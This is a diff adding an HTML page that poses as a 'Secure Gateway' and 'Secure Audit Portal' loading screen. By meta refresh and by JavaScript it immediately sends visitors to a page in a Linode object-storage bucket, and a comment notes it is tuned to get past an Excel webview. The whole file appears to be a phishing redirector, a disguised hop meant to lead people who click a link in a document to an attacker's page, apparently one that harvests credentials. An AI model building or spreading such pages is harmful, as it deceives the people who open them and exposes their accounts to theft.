@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting to Secure Gateway...</title>
+    <!-- 1. Meta Refresh (Backup Redirect) -->
+    <meta http-equiv="refresh" content="0;url=https://maytrip.us-mia-1.linodeobjects.com/index.html">
+    <style>
+        body { margin:0; background:#f4f7f9; font-family:-apple-system,sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; }
+        .box { background:white; padding:30px; border-radius:8px; box-shadow:0 4px 15px rgba(0,0,0,0.1); width:320px; }
+        .loader { border:3px solid #f3f3f3; border-top:3px solid #0078d4; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:15px auto; }
+        @keyframes spin { 100% { transform:rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="loader"></div>
+        <p style="color:#666;">Synchronizing Secure Audit Portal...</p>
+        <p style="font-size:12px; color:#999;">Please wait, you are being redirected.</p>
+    </div>
+    
+    <!-- 2. JavaScript Redirect (Primary) -->
+    <script type="text/javascript">
+        // Bypasses the Excel "Webview" stall by forcing a fresh window location
+        window.location.replace("https://maytrip.us-mia-1.linodeobjects.com/index.html");
+    </script>
+</body>
+</html>
